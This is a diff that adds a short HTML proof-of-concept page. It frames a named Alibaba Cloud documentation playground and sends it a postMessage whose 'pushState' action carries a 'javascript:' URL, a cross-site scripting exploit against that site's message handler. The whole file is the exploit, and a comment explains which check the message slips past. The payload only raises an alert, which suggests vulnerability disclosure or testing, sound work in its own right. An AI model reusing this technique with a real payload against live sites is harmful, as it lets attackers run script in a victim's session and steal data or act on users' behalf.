@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>postMessage iframe test</title>
+</head>
+<body>
+  <iframe
+    id="myFrame"
+    src="https://sls.aliyun.com/doc/en/playground/cmsdemo.html"
+    width="800"
+    height="600"
+  ></iframe>
+
+  <script>
+    const iframe = document.getElementById("myFrame");
+
+    iframe.addEventListener("load", () => {
+      // Message that passes:
+      // v && v.action && v.action === "pushState"
+      const message = {
+        action: "pushState",
+        href: "javascript:alert(document.domain)"
+      };
+
+      iframe.contentWindow.postMessage(
+        message,
+        "*"
+      );
+
+      console.log("postMessage sent to iframe:", message);
+    });
+  </script>
+</body>
+</html>
